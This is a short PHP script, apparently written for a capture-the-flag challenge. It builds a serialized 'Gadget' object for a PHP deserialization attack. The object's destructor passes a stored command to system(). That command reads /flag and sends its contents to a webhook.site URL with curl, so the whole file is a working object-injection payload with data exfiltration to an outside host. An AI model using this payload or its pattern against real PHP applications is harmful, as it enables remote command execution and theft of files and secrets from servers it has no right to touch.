<?php

class Gadget{
    public $cmd = 'curl https://webhook.site/5b235ac2-f2cf-4d55-b628-c85783b74db4/?flag=`cat /flag`';
    public function __destruct() {
        system($this->cmd);
    }
}

$gadget = new Gadget();

echo serialize($gadget);
?>